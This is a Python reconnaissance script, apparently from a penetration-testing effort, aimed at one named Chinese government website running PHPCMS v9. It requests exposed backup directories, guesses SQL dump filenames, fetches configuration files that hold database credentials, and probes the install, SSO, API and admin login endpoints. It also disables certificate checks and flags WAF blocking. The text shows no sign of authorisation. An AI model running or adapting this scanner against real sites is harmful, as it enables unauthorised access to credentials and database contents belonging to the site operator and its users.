#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""关键发现验证: PHPCMS v9 备份目录与敏感接口可达性"""
import requests, os, sys
os.environ["NO_PROXY"] = "*"
T = "http://www.qdjcy.gov.cn"
H = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

paths = [
    # robots.txt 暴露的目录
    "/db_backup_1491040787/",
    "/website_backup_1491040787/",
    "/cache/",
    "/phpcms/",
    "/install/",
    "/phpsso_server/",
    "/api/",
    "/admin/",
    # PHPCMS v9 已知敏感路径
    "/phpsso_server/index.php",
    "/phpsso_server/admin/",
    "/install/index.php",
    "/api.php?op=phpsso&code=1",  # PHPCSSO 已知接口
    "/api.php?op=count&id=1&modelid=1",
    "/index.php?m=member&c=index&a=register&siteid=1",  # 注册页
    "/index.php?m=member&c=index&a=login",  # 登录页
    "/index.php?m=admin&c=index&a=login",  # 后台登录
    # 备份目录常见文件名
    "/db_backup_1491040787/db.sql",
    "/db_backup_1491040787/dbbackup.sql",
    "/db_backup_1491040787/backup.sql",
    "/db_backup_1491040787/database.sql",
    "/db_backup_1491040787/1.sql",
    "/db_backup_1491040787/config.php",
    "/website_backup_1491040787/index.html",
    "/website_backup_1491040787/index.php",
    "/website_backup_1491040787/config.php",
    "/website_backup_1491040787/database.php",
    # PHPCMS v9 常见配置文件路径
    "/caches/configs/database.php",
    "/caches/configs/system.php",
    "/cache/configs/database.php",
    "/phpcms/caches/configs/database.php",
]

print(f"{'路径':<55} {'状态':<8} {'大小':<10} {'说明'}")
print("-" * 100)
for p in paths:
    try:
        r = requests.get(T + p, headers=H, timeout=8, allow_redirects=False, verify=False)
        size = len(r.content)
        note = ""
        if r.status_code == 401: note = "需认证(目录存在)"
        elif r.status_code == 403: note = "禁止访问"
        elif r.status_code == 200:
            if size < 100: note = "响应小(可能为接口计数)"
            elif "login" in r.text.lower()[:500]: note = "登录页"
            elif "register" in r.text.lower()[:500]: note = "注册页"
            elif "password" in r.text.lower()[:500]: note = "包含密码字段"
            elif "mysql" in r.text.lower()[:500]: note = "包含mysql"
        elif r.status_code == 301 or r.status_code == 302:
            note = f"重定向到: {r.headers.get('Location','')[:50]}"
        print(f"{p:<55} {r.status_code:<8} {size:<10} {note}")
    except requests.exceptions.Timeout:
        print(f"{p:<55} {'TIMEOUT':<8} {'-':<10} 超时(WAF?)")
    except requests.exceptions.ConnectionError:
        print(f"{p:<55} {'RST':<8} {'-':<10} 连接重置(WAF拦截)")
    except Exception as e:
        print(f"{p:<55} {'ERR':<8} {'-':<10} {str(e)[:50]}")
